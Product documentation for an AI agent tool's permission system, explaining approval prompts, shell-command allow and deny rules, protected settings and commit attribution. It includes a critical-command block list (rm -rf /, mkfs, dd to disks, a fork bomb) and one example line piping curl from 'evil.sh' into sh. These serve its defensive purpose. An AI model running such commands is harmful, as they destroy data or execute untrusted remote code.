# What runs without asking, and who can see your files

## The question aforge asks before it runs a tool — which key allows a command, what `1`, `2` and `3` do

When the model asks to run a tool and the rules say "ask", aforge blocks that
one call and draws a question above the input box. The call does not run until
you answer, and the conversation is paused on it.

The row above the question is **the call's own transcript row**, re-used rather
than described again — so what you approve is what you read. The question itself
hangs in a frame above the box, with the command on its first row and one row per
answer:

```
╭─ ? needs your ok to run bash ──────────────────────── bash · 7s ─╮
│ rm -rf build · bash pattern "rm -rf *"                           │
│                                                                  │
│ ▸ 1  allow once                                                  │
│   2  always, this command                                        │
│   3  deny                                           safe answer  │
│                                                                  │
│  ✓ just this once · for this project · from now on               │
╰─ ↑↓ choose · enter take it · esc later ──────────────────────────╯
  c change · ? ask back · t how long · 1–3 jump
```

The tool's own name and the wait mode are the aside in the top edge — ` · 7s`,
or ` · paused` once you have touched it or the reminder ran out, or ` · waiting`
when the countdown is off. Silence is never a no.

**Where the pointer opens is decided by the stakes, and by nothing else** —
never by which tool it is:

- **An ordinary call** opens on `1 allow once`, so `enter` allows it. Most gates
  are here: the rules had simply not seen this command before.
- **A call that cannot be taken back** — `rm -rf`, a force-push, a dropped table
  — opens on `3 deny`, and the row says `safe answer`. That frame also carries
  no `always` and no countdown: nothing about it may happen without you.

Nothing on a permission is painted in the question's amber except the marks —
the `?`, the pointer and the recommendation — because the command is the thing
you are here to read.

- `1` — allow this one call. The transcript row is annotated `allowed`.
- `3` — refuse this one call. The row is annotated `denied`. The model is handed
  an error result, `denied by the person: <rule>`, and keeps going.
- `2` — the widening yes. What it banks is a separate decision, and on a shell
  command aforge asks you which shape to bank before it answers.
- `c` — refuse or allow **in words**. It puts the cursor in the box (which was
  never taken away); type your sentence and press `enter`, and the words go to
  the model as the answer.
- `enter` — take the answer the pointer is on: `allow once` on an ordinary call,
  `deny` on one that cannot be taken back.
- `t` — **how long** the answer lasts. It walks the row of lifetimes under the
  answers and writes nothing until you answer.
- `esc` — **later**. The question folds in place to one titled rule, the chip on
  the status line carries its words, and **nothing is answered**. The call stays blocked and the conversation stays
  paused on it. This is the one word here that changed meaning: `esc` used to be
  spelled `cancel` and cancelling meant denying, which was the safe reading when
  the block was a modal nobody could leave.

`d`, `y`, `n` and `a` are not keys on this question. They were the block's keys
before every question in aforge moved onto one renderer with one key grammar; a
hand that remembers them is answering a question that no longer takes them, so
they do nothing here (`y`, `n` and `a` type themselves into the box). `t` is a
key again, and it is a different one: it walks the row of lifetimes rather than
answering anything.

**A key it does not draw belongs to your draft.** The question is not modal: the
box below it is live, typing goes into your message, and the question is still
there and still answerable the moment the box is clear. `ctrl+c` mid-turn — which
a blocked call always is — interrupts the blocked call exactly as it always has.

**A key pressed in the first quarter-second is dropped.** A question that lands
under a hand already moving would otherwise be answered by a keystroke aimed at
the sentence you were typing.

**And a letter reaches this question only once you have aimed at it.** `c` is
the first letter of "can you check the other table first" — so `c`, `d` and the
other letters go into an empty box until you press `↑`, `↓`, `tab` or `enter`,
or click an answer. `1`, `2` and `3` are printed on the answers in front of you
and always take them.

`[2]` is only drawn, and only acts, when the question is one that can bank an
answer. Every approval question is about a TOOL and can, so every one of them
offers it.

**It does not have to be answered in this window.** A conversation stopped on
this question says so on **home**, with the same three answers on the row —
`1 allow once`, `2 always`, `3 deny` — so a question raised in a terminal you are
not looking at can be answered from the dashboard (home's own page states the
limits, and what `2 always` banks when it is pressed there).

When more than one question is queued a `N more` line appears. Questions are
answered oldest first, and each gets its own countdown when it reaches the
front.

## I pressed ctrl+t while it was asking — where did the question go, and did my typing answer it

The question stays open and unanswered in the chat you came from. The **New chat**
start page takes every key while it is on screen: letters and digits go into its
first-message box, `enter` starts the new conversation, and `esc` returns to the
chat behind it. Nothing typed on that page can allow, deny, postpone or otherwise
answer the waiting question.

The question block is not drawn on the start page because its answer keys do
nothing there. The chat that is asking keeps `?` on its tab, and **Chats** says
`asking you something`. Press `esc` or select that chat to go back; the same
question returns with its numbered answers live.

Walking away does not turn silence into a no. If an approval countdown reaches
expiry while its question is behind the start page, it pauses instead of denying
the call. The unanswered question is still there when you return, with `paused`
on its row.

## What the answers row does on a narrow terminal

The one-row form needs about eighty columns. Below that it gives things up in a
fixed order, and **it never cuts an answer off the end** — an offer with an
answer missing is an offer that hides an answer.

1. The verbs go first, from the least useful backwards. `c change` goes before
   the clock does.
2. Then the clock. A countdown you cannot see is still a countdown; an answer you
   cannot see is not an answer.
3. Then the aside inside an answer's own word: `always, this tool (session)`
   becomes `always, this tool`.
4. Then the question **promotes to a card** — the head on one row, one row per
   answer with its key, and the verbs underneath:

```
? needs your ok to run bash
  bash pattern "rm -rf *" · aforge
    1  allow once
    2  always, this tool
    3  deny
  esc later
```

`[esc]` is never given up at any width: it is the way out, and a row with no way
off it is the modal this block replaced.

## The approval question on a phone-sized terminal

Under sixty columns the question becomes a **bottom sheet**, because `[1]` is
three cells for a thumb that covers ten:

```
───── ? bash ─────────────
 git commit -m "wave"
 bash pattern "git *"
──────────────────────────
 1 allow once
 2 always, this command
 3 deny
 2 more                 8s
```

Each answer is a **band the full width of the frame** — the whole row is the
target, not just its key. The command **wraps** instead of being cut, up to six
lines, and says so with `…` if even that was not enough. The clock keeps its own
corner, bottom right and off the bands, so reaching past it cannot answer. The
queue count sits beside it. Every row of the sheet swallows a press, so a press
that misses a band cannot reach the transcript underneath it.

`esc` is still *later* from the keyboard and has **no band**: folding a question
away is not an answer, and a full-width target that looked like one would be
read as the no.

## What is left where the question was: the receipt

An answered question leaves one dim line where it stood:

```
  decided needs your ok to run bash → allow once · you · 14:02 · c change
```

It is the same sentence the model reads in `the record`, so what you saw and
what it was told cannot become two accounts of one decision. It stays for about
half a minute and then it is history — the transcript row keeps its own
annotation for good.

**`u undo` on that line takes the permission back**, and it appears there as soon
as you answer one `always`:

```
  decided needs your ok to run bash → always · you · 14:02 · u undo · c change
```

While the receipt is on the screen and your box is empty, `u` hands the standing
yes back whole — this conversation stops remembering it, the line it saved in
your settings goes, and a connected account's capability that the yes switched on
goes back to asking. It asks you nothing, and the row it leaves says `taken back ·
this tool asks again`. **A shell `always` is the one exception**: the rule it saved
is about a command shape rather than a tool name, and the receipt does not know
which line it wrote, so `u` takes back this conversation's own memory and says
`taken back for this conversation · the saved command rule is in /permissions` —
which is where that line is removed for good.

`c change` on the same line asks you the same thing again instead, for when the
answer you want is `allow once` rather than nothing at all.

A question the asker took back says so once instead, and the chip's count drops:

```
  ⊘ needs your ok to run bash — no longer needed · the turn moved on without it
```

## Answering a question you put off — the chip

`esc` folds a question rather than answering it, so the status line carries a
chip for as long as anything is open:

```
? 1 question · alt+a
```

`alt+a` raises the newest open question from **any page** — home, a room, the
tasks place — and takes you back to the conversation it belongs to. The count
includes the ones you folded: `esc` is later and not cancelled, so a question you
put off is still a question the work is waiting on.

## Why did it ask my permission before running that — the dim line under the offer

The dim line beneath the offer is the rule that produced the question, in the
rules' own words. It can read:

- `default`
- `default (unset)`
- `tool "edit"`
- `bash pattern "rm -rf *"`
- `critical command "rm -rf /"`
- `<tool> acts in your name outside this machine`
- `you said yes to "<phrase>"`
- `"<phrase>" is set to ask first`

The same sentence is what the model is told when a call is refused.

## The countdown: silence waits — why an unanswered approval is not denied, and whether an approval question expires while you are in another chat

A question that is not answered stays a question. Silence is never a **no**.

The reminder is **10 seconds** by default. The setting is
`approval.timeout_seconds`, labelled "approval countdown" in `/settings`.

At expiry aforge **pauses** and keeps waiting — it never denies the call, and
it never allows it. The offer tail reads `paused` (or `waiting` when the
countdown is off) and the work stays blocked until you answer. The transcript
row is not annotated `denied · no answer`; that wording was a previous build
answering no for you.

Any key the question reads, and any press on its answers, stops the clock
**permanently**. There is no way to start it again; the tail then reads
` · paused` and the question waits for you. Setting the countdown to `0` turns
the clock off from the start, and every question waits forever.

The clock **only runs while that terminal window has the keyboard**. Switch to
another window and it stops where it is; come back and it starts again from the
full 10 seconds. See "Does my other window keep working when I switch away".

The clock is drawn in whole seconds. The wait mode is on the tail so what
silence will do is not hidden.

## Does my other window keep working when I switch away — why my other session looked frozen

Yes, and this used to be the one thing that stopped it.

The work itself never depended on you looking. A turn runs in the session, not
on the screen: the model keeps streaming, tools keep running, and tasks keep
going whether the window is in front of you, behind another one, or on another
desktop. Nothing about drawing the picture is tied to which window has focus.

The approval countdown was the exception, and it is fixed. It used to run on a
window nobody was looking at, so a session that hit the gate ten seconds after
you walked away had that call **denied** — by a clock you could not have beaten,
about a question on a screen behind you. The model was handed a refusal, tried
something else, was refused again, and the session you came back to had spent
your absence getting nowhere. That is what "my other window stopped working"
was.

Now the countdown is a clock about **reading**, not about wall time. It is held
for as long as the window is unfocused, and starts again whole the moment you
come back — so a question you never saw is still there when you get to it.

**And the same is true of a conversation you switched away from inside this
terminal.** A conversation you have switched away from holds its approval
question for as long as you are away. A task it proposed still starts by itself
after its countdown, and a sign-in offer still lapses after five minutes — both
say `waiting on you` on home until they do. Coming back gives you the reading
time you had left rather than a fresh clock, and only for a question the session
is still asking: one answered or cancelled while you were away is not put back
on the screen.

Two things tell you a window is waiting while you are elsewhere:

- **A desktop notification**, sent the instant the question goes up. The banner
  is headed `aforge` and reads `<conversation> · waiting on you`.
- **Home**, and every other aforge window, where the session's row wears `?`,
  reads `waiting on you`, and sorts to the top of its project. The status line
  says it too, as the `· 1 waiting` half of `2 open · 1 waiting`.

If your terminal does not report focus to the programs inside it, aforge
assumes the window is focused — so the countdown runs, and at expiry it pauses
rather than answering no, and no banner is sent. There is no setting for
either; both are on.

## Why did my session stop after I switched windows — what to check

Work does not stop because you looked away, so if a session really is going
nowhere, it is one of these:

- **A question is up.** The most common one. The answers row under the call
  reads `allow?`; the call is blocked until you answer, and the countdown is held
  while you are away rather than answering for you. If you pressed `esc` on it,
  it is folded to the chip — `? 1 question · alt+a` on the status line — and the
  work is still waiting on it.
- **A call was already denied while you were gone** on a build from before
  silence stopped answering no. The row says `denied · no answer`. Say so and
  the model will ask again. A current build does not write that; the question
  is still up.
- **The turn finished.** A turn that ends on an unfocused window sends its own
  desktop banner, `<conversation> · turn done`.

Nothing here is a pause you can resume: aforge has no key that suspends a
session and none that wakes one.

## How long an answer lasts: once, this session, or written down — how to make it stop asking every time, stop asking me for this, remember this

There is a row for it on the frame. Under the answers, where the question offers
more than one lifetime, aforge draws them in your own words with a tick on the
one that is on, and `t how long` walks between them:

```
  ✓ just this once · for this project · from now on
```

It starts on **just this once**, always. Pressing `t` changes that row and
nothing else — nothing is written and nothing is answered until you give an
answer, so you can cycle it and press `esc` and have written no rule. The
lifetime you leave it on travels with the answer you then give.

**Two things are never offered there.** A lifetime the question did not offer —
only the asker knows whether a rule for this shape can be written at all — and
any lifetime at all on an **irreversible** call: something that cannot be taken
back is asked about every single time, and the row is absent rather than
refusing.

- **Once** — `1`, `3` and a typed answer under `c` answer this call and nothing
  else. `esc` answers nothing at all: it puts the question off.
- **For the session** — a "stop asking" answer is kept in memory for the rest of
  this agent's life. It is deliberately coarse: it answers for **the whole
  tool**, so a session memo about bash covers every bash command the rules would
  have asked about. It is written nowhere on disk.
- **A written rule** — when always banks a real rule, aforge writes it into your
  settings *before* the answer is delivered. Because a real rule now exists, no
  session memo is written. The consequence is worth knowing: the next call goes
  back through the rules, and if the shape you picked is narrower than you
  expected, you will be asked again.

A "no, and stop asking" is kept as a session memo only. **The card never writes
a deny to disk.** A standing never is a line you type into the settings sheet on
purpose.

An answer whose scope cannot be read is treated as **once** — the narrow reading
is the safe one.

## What "always" means when you press `2`: what "always" banks, and how wide the rule is

Pressing always is not one decision. On a shell command it is two.

For `bash`, and only for bash, pressing `2` **does not answer yet**. It replaces
the answers row, in place, with the shapes the rule could be written as:

```
always? 1 git status*  ·  2 git *  ·  3 just this line  ·  esc never mind
```

So pressing always on `git status` can bank `git status*`, or `git *`, or the
single line `git status` — and `git *` is every git command you will ever run.
**You are choosing how wide the rule is.** Whatever you pick is exactly what is
written; nothing widens on its own.

- `1`–`9` pick a shape.
- `esc` backs out of the beat and puts the original question back exactly as it
  was. It answers nothing — and this is the one place `esc` does not mean *later*,
  because what is on screen is a step inside an answer.
- The digits are the **beat's**, not the question's: while it is up, `3` is the
  third shape and not `deny`. The row under your eyes is the shapes.

The last entry always reads `just this line`. It is the command line itself,
named rather than reprinted so the command is not on screen twice.

If only one shape can be derived, or none, there is no second beat and the
answer is sent straight away. A command whose arguments never arrived whole
derives nothing and writes nothing.

For every other tool, always banks the tool. The word on the key says which of
the three you are getting: `always, this command` (bash), `always, this tool`,
or `always, this tool (session)` when there is nothing to write to and the
answer lasts for this agent's life only. On a narrow frame the ` (session)` is
dropped before any answer is.

## The shapes offered for a shell command, exactly

Given one command line, aforge offers up to three shapes, in this order:

1. **The verb run, plus `*`** — the leading run of plain command words, joined,
   with `*` appended. `git status --short` becomes `git status*`. Offered only
   when that run is at least two words.
2. **The program, plus ` *`** — the first word, a space, then `*`.
   `git status --short` becomes `git *`. The space is deliberate: `git*` would
   also match `gitleaks` and `git-lfs`.
3. **The line itself**, trimmed. Always last.

A verb run stops at the first word that is not a bare word — a flag, a path, a
quote, a wildcard, an assignment. A bare word is a letter followed by letters,
digits, `-`, `_` or `.`.

The list is capped at three, and when it is trimmed the cut is taken out of the
middle, so the plain line always survives as the last entry.

Four shapes are never offered:

- one that pins no word down (all wildcards and punctuation);
- one whose only word is `sudo` or `doas`;
- anything at all derived from a **compound** line — an allow rule can never
  fire for one, so there is nothing honest to offer;
- one containing a control byte.

## Where a banked "always" goes, and when it starts working

A tool always writes `<tool>:allow` into `tools.approval` in your own profile
settings. A bash always appends `allow <shape>` to `tools.bashPatterns`.

The write goes to your **profile only**. A repository's `.aforge-v3/config.json` is
never written from here. Because a repository that answers `tools.approval`
replaces your whole row at launch, a preference banked here takes effect
everywhere except inside that repository.

The new rule bites on the very next call rather than waiting for another launch.
Under `--no-host`, the running session's gate is rebuilt from the profile at once.
On a plain launch through this machine's engine, the rule is written and the engine
rebuilds its running gate from that profile before the answer is applied, so the next
matching call is allowed. The row then says, literally:

```
always · saved — /permissions to change
```

If the write failed, the row says `allowed` instead, and the failure is dropped
silently.

A bash always refuses, and says so, when:

- the shape is compound —
  `a compound command cannot be remembered: an allow answers for one whole command`
- it names no command — `"<x>" names no command to allow`
- the existing settings row does not parse —
  `settings row "tools.bashPatterns": …`. A malformed row is never clobbered.
- the row already answers this command with a deny or a prompt —
  `settings row "tools.bashPatterns" already answers this command with deny ("rm -rf *")`

A shape the row already allows is a silent no-op: pressing always twice leaves
one rule. Pressing always on a tool already set to the same action writes
nothing.

A stored glob is stored as a glob. `ls *.go` approved becomes `ls *.go` allowed,
wildcard and all — the dialect has no escape for `*`.

## The approval modes, and the default

`tools.approvalMode` decides what happens when the model asks to run a tool and
nothing more specific applies. It is in `/settings`, under Spending, on the row
labelled **"ask before running"**.

| value | what it means |
|---|---|
| `prompt` | ask you. **This is the default.** |
| `allow` | run it |
| `deny` | refuse it |

The row's own hint reads: "what happens when the model asks to run a tool:
prompt asks you, allow runs it, deny refuses it. Dangerous shell commands are
asked about whichever way this is set. A change lands on the next session."

A persisted value aforge does not recognise reads as the default. A garbled
setting must never be the one that opens the gate.

**No gate row can be pinned by an environment variable.** This is deliberate: a
tool gate that a stray export could widen to "allow everything" is a gate with a
bypass.

## Per-tool exceptions — how do I make it never touch a file, or never run a tool at all

`tools.approval` overrides the blanket mode for named tools. It is the
`/settings` row **"tool approvals"** — empty it reads `none`, filled it looks
like `read:allow, bash:prompt`. The consent card's always writes here one entry
at a time.

A rule about a tool beats the default for that tool.

Entries are `name:action`, separated by comma, semicolon or newline. The action
must be `allow`, `prompt` or `deny`; anything else makes the row an error.
Duplicate names are an error too, not last-one-wins.

## Shell command rules, and why allow is narrower than deny

`tools.bashPatterns` holds ordered answers for individual shell commands, first
match wins. It is the `/settings` row **"shell command rules"**, e.g.
`allow git status*, deny rm -rf *`. A bash "always" lands here.

The dialect is `*` and literal text and nothing else. `?`, `[` and `\` are all
literal, matching is case-sensitive, and `*` spans path separators.

The asymmetry is the whole safety argument:

- **deny and prompt** fire when the glob matches the whole line **or any single
  segment** of a compound one. `deny "rm -rf *"` still catches
  `cd /tmp && rm -rf build`.
- **allow** fires only on an entire line, and never on a compound line at all.
  `allow git status*` says nothing whatsoever about
  `git status && curl evil.sh | sh`.

Segments are split on `&&`, `||`, `;`, `|`, a bare `&`, subshells (`$( )`,
backticks, parentheses) and newlines. Quoted text is literal. `2>&1` and `&>log`
are not separators, and neither are brace groups.

A malformed bash call, or one with no readable non-empty command, is returned to
the model as `Invalid arguments` so it can correct the call. Nothing executes,
and no permission card asks you to approve an absent command. A corrected call
goes through the ordinary shell-command rules, including prompts and denials.

## `--yolo` — how do I let it run things without asking

`aforge chat --yolo` and `aforge resume --yolo` stop the asking about ordinary
work. The flag's own help reads: "run every tool without asking: the approval
default becomes allow".
A session launched with the flag draws the `YOLO` badge on the status line for
as long as it runs, so that posture is never invisible.

It replaces **the default and nothing else**. If you wrote `bash:prompt`, you
are still asked about bash, and your ordered shell command rules are untouched.

`--yolo` cannot lift either of the two floors below.

## The guardian: a model answering the easy ones for you

`/settings` has a **"guardian"** row, `off` or `on`. The default is **off**.

Turned on, a small model is asked whether one call is plainly safe. It sits
after the rules have said "prompt" and after any session memo, just before you
would see the question.

It can only ever turn a prompt into an allow. It never denies, never widens an
allow, and never sees a call the rules refused. Its whole instruction is a
binary contract: it must answer the single word `ALLOW` or `ASK`. Any other
reply, an error, an interrupt, or a model it cannot resolve all fall through to
you. The arguments it is shown are clipped at 2000 bytes, and it sees no
transcript at all.

**It can never approve something the rules above refuse**, and it never stands
in for you on a call that acts in your name. It does not run on the early-start
path.

**It is the one thing aforge asks that really does hold the work up**, and it says
so while it does. Everything else a turn asks on your behalf — the memory lookup,
the judges, the reader of a long answer — runs beside your answer and can never
delay it (*Screen*). This one decides whether the command runs at all, so there is
nothing for it to run alongside. It answers in **ten seconds or not at all**, and
for the whole of that the status line reads
`checking whether this is safe to run`. Past ten seconds it falls through and you
are asked, exactly as if it had said `ASK`.

## The floor nothing lifts: dangerous shell commands

A short table of shell shapes is asked about **whichever way your settings are
set**. A blanket `allow` does not switch it off. `--yolo` does not switch it
off. A pushed policy cannot widen it.

The entries, verbatim:

`rm -rf /`, `rm -rf /*`, `rm -fr /`, `rm -fr /*`, `mkfs*`, `dd *of=/dev/*`,
`*>/dev/sd*`, `shutdown`, `shutdown *`, `reboot`, `reboot *`, `halt`, `halt *`,
`poweroff`, `poweroff *` — plus the fork bomb, matched with all whitespace
removed and reported to you as `:(){:|:&};:`.

Before matching, the line is normalised: runs of whitespace collapse to one
space, the gap after `>` closes (so `> /dev/sda` and `>/dev/sda` are the same
thing), and a leading `sudo` or `doas` is dropped (so `sudo reboot` reads as
`reboot`).

The `/*` entries deliberately over-fire: they catch
`rm -rf / --no-preserve-root`, and they also catch plain `rm -rf /var/tmp/x`.

**The table is a floor under allow only.** It turns an allow into a **prompt**,
with the rule `critical command "rm -rf /"`. It is never a refusal of its own:
an explicit deny still denies, and an existing prompt still prompts.

This is a floor, not a sandbox. It is not an attempt to enumerate every way a
shell can ruin a machine.

## The floor nothing lifts: anything acting in your name

Calls that leave this machine in your own name are asked about even under a
blanket allow.

The named table is exactly three tools: **`gmail_send`**, **`calendar_create`**
and **`slack_send`**.

Beyond those, any tool whose name ends in **`_request`** — the raw call a
key-connected account brings, such as `stripe_request` — is judged by its verb.
A `GET`, or no arguments at all, is a read. Every other method acts. **An
argument payload that cannot be read counts as one that acts**: the safe reading
of "I do not know" is the one that asks.

A served tool that the account did not mark read-only is included too.

A blanket allow — the settings row set to `allow`, or `--yolo` — becomes a
**prompt**, with the rule `<tool> acts in your name outside this machine`.

The floor holds under the **default**, and it yields to a rule that **names the
tool**. `gmail_send:allow` in `tools.approval` runs it silently. So does a
capability set to `yes`. So does a remembered "always" answer. Nothing else
lifts it.

## Neither floor can be swallowed by "stop asking me"

Before any session memo is consulted, aforge asks whether the call is one of the
two floors. It returns true for anything acting in your name, and for a bash
call matching the critical-command table.

Both bypass the memo entirely and put the question to you **every time**. One
approved `git status` plus "stop asking me about bash" cannot quietly run
`rm -rf /` for the rest of the session.

It is deliberately not the whole rule set asked over again — only those two. A
bash call whose command cannot be read is not on this list, because the rules
already turned it into a prompt of its own.

## Who can see my files — privacy and file access: what aforge can read without asking, does git status need approval

**Privacy: who can see my files.** In the default `prompt` mode, a look is not
a question. aforge can read and open these files without asking — the policy
itself allows these without a card, even before the seeded row below is applied:

- **`read`, `ls`, `grep`, `find`** — they change no file.
- **`tasks` when it is a look** — a search, or one task's page. `say`,
  `continue` and `resolve` still ask, because they write into a node.
- **`git status`** and its flags (`git status --short`, `git status --porcelain`)
  when no shell-command rule list has been written. A compound line
  (`git status && curl …`) still asks. A pattern you wrote still wins.

A written `read:prompt` still asks about `read`. A deny-everything blanket
still denies. A Policy with nothing configured still asks — "no settings" is
not the shipped default.

Some tools this build never had a reason to ask about are also seeded as `allow`
underneath whatever you wrote:

- **Reads of this machine** — `read`, `grep`, `find`, `ls`.
- **`jobs`**, whose list and output are reads of processes you already started.
  Its kill is **not** on the floor; that inherits the blanket mode, which asks.
- **The agent's own bookkeeping** — `remember`, `track` and `recall`. These
  write to and read from the working state aforge keeps for itself.
- **`manual`**, which reads pages compiled into this binary and touches no disk
  at all. Asking you to approve aforge looking up its own documentation would be
  asking about the wrong thing.
- **`settings`**, which reads your own settings rows back through the registry.
  It is `manual` one file over: "what is my daily budget" is a lookup, and the
  credential rows read masked, so a question would be protecting nothing.

**`commit` is deliberately not on it.** It is the one bookkeeping tool that
declares a tracked subgoal finished, and a session that can mark its own work
done without anyone being asked is a session that can talk itself into done.

**`change_setting` is deliberately not on it either**, and for the same reason
one step further out. Changing your configuration writes a file that outlives
the conversation, so it goes to you like `edit` and `write` do. That split is why
the settings pair is two tools rather than one with a read action and a write
action: a rule is written per **tool name**, so a single tool could not have been
free to read and asked about to write.

A rule you write about one of these tools still wins for that tool. What the
floor removes is only the silent part: a rule written about one tool now says
nothing whatsoever about any other.

Nothing on this list acts outside this machine, so it changes neither of the two
floors above.

## The settings aforge refuses to change for you

aforge can change your settings when you ask — `settings` reads the rows,
`change_setting` writes one permanently into your profile. Some rows it will not
write, however you ask, and the reason is the plainest one there is: **a model
that can widen its own restraints has none.** It does not take bad intent, only
a short road — asked to stop being interrupted, the shortest thing to reach for
is the approval mode, and you would have lost the gate without ever deciding to.

The refusal names the row and points here:

```
"ask before running" (tools.approvalMode) decides what I may do without asking you first, so it is not mine to change. Open /settings and change it yourself.
```

The whole list, by settings key:

- **What may run without asking you** — `tools.approvalMode`,
  `tools.approval`, `tools.bashPatterns`, `approval.guardian`,
  `approval.timeout_seconds`, `task.autoapprove_seconds`. The gate, the two rule
  rows, the model that answers in your place, the reminder that pauses rather
  than answering no, and the task clock that starts work if you say nothing.
- **What may be spent without asking you** — `daily_budget_usd`,
  `plan_consent_usd`, `practice_budget_usd`, `session.spendRailUSD`,
  `task.repair_rounds`, `working_set_tokens`, `context_reuse_pct`. The last three
  are rails too: each is a number that multiplies what one piece of unattended
  work costs.
- **How hard this machine may be worked** — `task.parallel`, `task.max_load`,
  `task.min_free_mb`, `bash.background_after_seconds`. The last is labelled
  **background after** on `/settings`' Safety tab and arms both the engine's handoff
  clock and the countdown for the next session.
- **Whether aforge's own work is checked** — `task.audit`. A session that can
  switch off the check can call anything done.
- **How work that leaves this machine is signed** — `attribution`.
- **Your credentials** — `search.exaKey`, `search.firecrawlKey`, `search.jinaKey`,
  `google_oauth_secret`, and `google_oauth_client`, which is useless without the
  secret beside it. These restrain nothing; they are refused because a key
  overwritten with something a model invented is a working account broken in a
  way nothing on screen can show you. Search credentials written by you are read
  again on the next search in the running conversation; no restart is needed.

Everything else is fair game: which model does what, how the screen draws, how
long the room stays quiet, where a search goes, which model draws your pictures.

For the background clock, the exact refusal is:

```
"background after" (bash.background_after_seconds) is one of the brakes on how much work may run at once on this machine, so it is not mine to change. Open /settings and change it yourself.
```

Two rows are refused for a different reason, and it is not safety. The
conversation's own model (`model.talk`) is changed with `/model`, and the other
role slots — `model.plan`, `model.work`, `model.verify`, `model.scribe` — are
bindings the running session holds rather than values in your profile, so
neither `change_setting` nor the panel can write them. To send aforge's own
auxiliary calls somewhere, set one of the five crew classes
(`models.tiers.reflex`, `models.tiers.low`, `models.tiers.worker`,
`models.tiers.high`, `models.tiers.mastermind`), set all five at once with
`models.crew`, or pin one role in `models.roles`.

A row your environment has pinned refuses like it does everywhere else:
`<label> is set by <NAME>`.

## Does aforge sign my commits — why is there a co-author on my commit, who is agentfield-bot, how do I turn the trailer off

Yes, unless you turn it off. There are three marks and no others, and this is
exactly what each one looks like.

**A commit** ends with a blank line and one trailer:

```
Co-Authored-By: aforge <agentfield-bot@users.noreply.github.com>
```

**A pull request or an issue** ends its body with a line holding an em dash, and
then one sentence:

```
—
Drafted with [agentfield ai](https://agentfield.ai/github?utm_source=github&utm_medium=pull_request&utm_campaign=drafted_with) · reviewed and owned by the author
```

On an issue that link reads `utm_medium=issue` instead.

**A comment** — on an issue, on a pull request, on a line of a review — ends
with one small muted line, no em dash above it:

```
<sub>drafted with [agentfield ai](https://agentfield.ai/github?utm_source=github&utm_medium=comment&utm_campaign=drafted_with)</sub>
```

`agentfield-bot` is aforge's own GitHub account and the address is the one GitHub
hands out for it. The marks are provenance — another pair of hands typed this —
and they are the only trace left on your work.

## Will it sign every comment it leaves — how gentle the comment line is, and where none of the three ever appear

**A comment thread gets the line once.** The first comment aforge leaves in a
thread carries it; every later comment in that same thread carries nothing. It
is also left off entirely on a one-line reply, on anything inside a code block or
a suggestion block, and on a comment you dictated word for word — those are your
words and aforge does not sign them.

None of the three ever appear in a commit subject, in a code file, in a README,
in anything aforge writes for you such as a report or a deck, or in what it says
back to you in this conversation. If you see one somewhere else, that is a fault
worth reporting.

**A repository that says no wins.** If a CONTRIBUTING file or a stated policy
forbids AI trailers or generated-by lines, aforge leaves all three out and tells
you it did.

**To turn it off**, open `/settings` and switch the **attribution** row off, or
set `AFORGE_ATTRIBUTION=0` in your environment. It is on by default. aforge
cannot change this row for you — ask it to and it says so and points you at
`/settings` — because a signature is yours to decide. A change lands on the next
piece of work handed off, and on the next aforge you start.

The commit a task writes when its work lands carries the same trailer. Those
commits are authored as `aforge <aforge@localhost>` and always have been: aforge
reads that name to tell its own commits from yours when it lands a branch. Your
own commits are authored by you and are never touched.

## A timeout is not a deny — why it said "denied by the person" when nobody said no

A wait that ends without an answer is not a person's no. The model used to be
handed `denied by the person: <rule>` — including `denied by the person: default`
on a `propose_task` that simply ran out of time. That sentence is only for a
key someone pressed (`n`, `d`, or `esc` on the card).

If the question timed out, the model is told `not approved: the question timed
out`. If the turn ended, or the agent closed, first: `not approved: ended
before an answer`. Silence on the card still pauses and keeps waiting; it
does not produce either of those.

## When nobody is watching

`aforge chat --once "…"` runs with no one to ask. A "prompt" decision then
**refuses** rather than hanging or silently allowing:

```
needs approval but no resolver is attached: <rule>
```

Inside a task node the refusal reads
`refused in a task: <rule> — nobody to ask`. A wait that ends without an answer
is never worded as a person's no. A timed-out question refuses with
`not approved: the question timed out`. A turn (or the agent) that ends first
refuses with `not approved: ended before an answer`.

## What a refused call looks like to the model

Every refusal is an ordinary error result the model can act on. It is never a
hang, and never the end of the turn. The exact sentences:

- `denied by approval rule: <rule>`
- `denied by approval rule: <rule> (remembered for this session)`
- `denied by the person: <rule>`
- `not approved: the question timed out`
- `not approved: ended before an answer`
- `needs approval but no resolver is attached: <rule>`
- `refused in a task: <rule> — nobody to ask`

## Questions are never written to the session file

Consent requests and answers are events only; they never enter the session file.
A denied call never ran, so the record afterwards shows only the tool result or
the refusal handed to the model. A resumed conversation never replays a
question.

The transcript row's `allowed` / `denied` / `always · saved` annotation is one of
the few things the screen records that the session file never will.

## `/permissions`: what you have already banked

`/permissions` — alias `/perms` — lists the answers you have banked and lets you
take one back. The menu describes it as
`what runs without asking · drop one with d`.

It draws one heading, literally `what runs without asking`, and under it one row
per banked line, read fresh from disk each time it opens.

Two glyphs: `$` for a row about one shell command, `◇` for a row about a whole
tool. Shell rules keep the order they were written in, because first match wins
and reordering them would lie. Tool exceptions are sorted alphabetically.

The dim right-hand tail carries only what the heading has not already said:
nothing for a shell allow, `every call` for a tool row, `asks every time` for a
`prompt` row, `refused` for a `deny` row.

Keys: `↑`/`ctrl+p` and `↓`/`ctrl+n` move, `pgup`/`pgdown` page by 9, `enter` or
`d` arms and then drops, `esc` un-arms first and closes second. Clicking a row
moves the cursor there and arms it; clicking outside closes the panel. The list
is at most 10 lines including the heading.

With nothing banked it draws the heading and nothing under it — no "no
exceptions", no "0 rules". A settings row that does not parse is reported in the
transcript (`the shell command rules do not read back · <err>` or
`the tool exceptions do not read back · <err>`) and never redrawn as an empty
list.

**The rows are yours, not the policy in force.** Inside a repository that
answers `tools.approval`, its row replaces yours wholesale at launch, so what
you see here is what you carry everywhere else.

## Dropping a banked rule, and when it stops working

In `/permissions`, `enter` or `d` twice on a row drops it. The first press arms
it and the row's tail changes to `enter again to drop it`; the second press
drops it. Moving the cursor disarms.

A shell row is removed **by index**, because two lines may carry the same glob
and their order is your own priority statement. A tool row is removed by name,
leaving the others in the order they were written. After the drop the list is
re-read and the cursor holds its place, not its row.

The receipt in the transcript is `dropped · <name>`.

Under `--no-host`, a drop is live on the very next call. On a plain launch
through this machine's engine there is no take-back door to the running gate,
so the receipt is `dropped · <name> · from the next session`. The panel never
claims an effect it did not deliver.

`/new` and `/resume` open on the rules as they stand right now, not the ones the
session launched with.

A failed drop is said out loud. If the row moved since it was read, the error is
`"<name>" is no longer on the list`; if the setting cannot be changed here,
